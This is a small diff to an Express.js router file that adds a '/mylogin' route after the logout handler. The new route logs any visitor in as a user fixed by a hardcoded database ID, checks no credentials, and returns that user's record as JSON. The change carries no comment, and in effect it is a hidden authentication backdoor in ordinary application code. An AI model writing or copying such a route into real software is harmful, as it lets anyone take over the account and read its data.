@@ -46,4 +46,17 @@ router.get('/logout', function(req, res) {
         success: 'successfully signed out'
     });
 });
+
+router.get('/mylogin', function (req, res) {
+    User.findOne({
+        _id: '572292626d8eac97117054b9'
+    }, function (err, user) {
+        if (err || !user) {
+            return res.send('False');
+        }
+        req.logIn(user, function (err) {
+        });
+        res.json(req.user);
+    });
+});
 module.exports = router;
